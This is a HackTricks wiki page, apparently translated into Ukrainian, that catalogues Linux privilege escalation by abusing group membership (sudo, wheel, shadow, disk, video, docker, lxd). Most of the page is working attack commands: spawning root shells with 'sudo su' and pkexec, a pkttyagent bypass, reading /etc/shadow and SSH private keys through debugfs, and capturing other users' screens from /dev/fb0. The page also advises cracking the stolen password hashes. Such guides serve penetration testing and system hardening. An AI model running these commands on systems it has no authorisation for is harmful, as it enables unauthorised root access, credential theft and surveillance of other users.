{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Sudo/Admin Groups

## **PE - Метод 1**

**Іноді**, **за замовчуванням \(або через те, що деяке програмне забезпечення цього потребує\)** всередині файлу **/etc/sudoers** ви можете знайти деякі з цих рядків:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи sudo або admin, може виконувати будь-що як sudo**.

Якщо це так, щоб **стати root, ви можете просто виконати**:
```text
sudo su
```
## PE - Метод 2

Знайдіть всі suid бінарні файли та перевірте, чи є бінарний файл **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Якщо ви виявите, що двійковий файл pkexec є SUID-двоїстим файлом і ви належите до sudo або admin, ви, ймовірно, зможете виконувати двійкові файли як sudo, використовуючи pkexec. Перевірте вміст:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Там ви знайдете, які групи мають право виконувати **pkexec** і **за замовчуванням** в деяких linux можуть **з'явитися** деякі з груп **sudo або admin**.

Щоб **стати root, ви можете виконати**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Якщо ви намагаєтеся виконати **pkexec** і отримуєте цю **помилку**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Це не тому, що у вас немає дозволів, а тому, що ви не підключені без GUI**. І є обхід цього питання тут: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібно **2 різні ssh сесії**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**Іноді**, **за замовчуванням** у файлі **/etc/sudoers** ви можете знайти цей рядок:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи wheel, може виконувати будь-що як sudo**.

Якщо це так, щоб **стати root, ви можете просто виконати**:
```text
sudo su
```
# Shadow Group

Користувачі з **групи shadow** можуть **читати** файл **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Отже, прочитайте файл і спробуйте **зламати деякі хеші**.

# Дискова група

Ця привілегія майже **еквівалентна доступу root**, оскільки ви можете отримати доступ до всіх даних всередині машини.

Файли:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Зверніть увагу, що використовуючи debugfs, ви також можете **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` до `/tmp/asd2.txt`, ви можете зробити:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Однак, якщо ви спробуєте **записати файли, що належать root** \(як `/etc/shadow` або `/etc/passwd`\), ви отримаєте помилку "**Доступ заборонено**".

# Група відео

Використовуючи команду `w`, ви можете дізнатися, **хто увійшов в систему**, і вона покаже вихід, подібний до наступного:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** означає, що користувач **yossi фізично увійшов** до терміналу на машині.

**Група video** має доступ до перегляду виходу екрану. В основному, ви можете спостерігати за екранами. Щоб це зробити, вам потрібно **захопити поточне зображення на екрані** в сирих даних і отримати роздільну здатність, яку використовує екран. Дані екрану можна зберегти в `/dev/fb0`, а роздільну здатність цього екрану можна знайти в `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Щоб **відкрити** **сирий образ**, ви можете використовувати **GIMP**, вибрати файл **`screen.raw`** і вибрати тип файлу **Сирі дані зображення**:

![](../../.gitbook/assets/image%20%28208%29.png)

Потім змініть Ширину та Висоту на ті, що використовуються на екрані, і перевірте різні Типи зображень \(і виберіть той, який краще відображає екран\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Група Root

Схоже, що за замовчуванням **учасники групи root** можуть мати доступ до **модифікації** деяких **конфігураційних файлів сервісів** або деяких **файлів бібліотек** або **інших цікавих речей**, які можуть бути використані для ескалації привілеїв...

**Перевірте, які файли можуть модифікувати учасники root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Group

Ви можете змонтувати кореневу файлову систему хост-машини до обсягу екземпляра, тому, коли екземпляр запускається, він відразу завантажує `chroot` у цей обсяг. Це ефективно надає вам root на машині.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Group

[lxc - Підвищення привілеїв](lxd-privilege-escalation.md)


<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) для легкого створення та **автоматизації робочих процесів**, підтримуваних **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Вчіться та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
